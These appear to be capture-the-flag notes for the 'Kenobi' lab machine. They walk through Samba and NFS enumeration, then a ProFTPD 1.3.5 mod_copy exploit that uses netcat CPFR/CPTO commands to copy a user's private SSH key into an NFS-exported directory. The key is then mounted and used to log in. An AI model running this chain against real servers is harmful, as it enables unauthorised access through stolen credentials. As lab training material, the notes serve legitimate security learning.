# Kenobi
## Samba 
Implements SMB for Linux

```bash
nmap -p 445 --script=smb-enum-users.nse,smb-enum-shares.nse $IP
```

grab log.txt
```bash
smbget -R smb://<ip>/anonymous
```

A user `kenobi` has generated a key pair and started a ProFTP server.

## RPCBind
Network file system on port 111 exposing /var

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

## ProFTPD
1.3.5 is vulnerable to mod_copy

```bash
 $ searchsploit proftpd | grep 1.3.5          
```
> ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)               | linux/remote/37262.rb
> ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                     | linux/remote/36803.py
> ProFTPd 1.3.5 - File Copy                                               | linux/remote/36742.txt

CPFR/CPTO kenobi id_rsa to /var/tmp
```bash
nc $IP 21
CPFR /home/kenobi/.ssh/id_rsa
CPTO /var/tmp/id_rsa
```

## Network Share
```bash
sudo mount $IP:/var /mnt/kenobinfs
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP
```
